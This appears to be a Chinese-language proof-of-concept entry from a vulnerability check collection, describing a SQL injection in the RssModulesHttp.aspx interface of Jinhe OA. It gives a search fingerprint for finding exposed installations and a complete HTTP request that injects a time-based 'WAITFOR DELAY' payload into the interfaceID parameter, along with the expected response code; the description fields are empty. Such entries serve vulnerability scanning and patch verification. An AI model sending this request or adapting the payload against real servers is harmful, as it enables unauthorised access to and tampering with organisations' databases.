﻿# 金和OA RssModulesHttp.aspx接口SQL注入漏洞

> 更新时间：2024-03-01

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="金和网络-金和OA" && body="/c6/"

> 验证脚本：HTTP

```
GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：金和OA RssModulesHttp.aspx接口SQL注入漏洞.poc

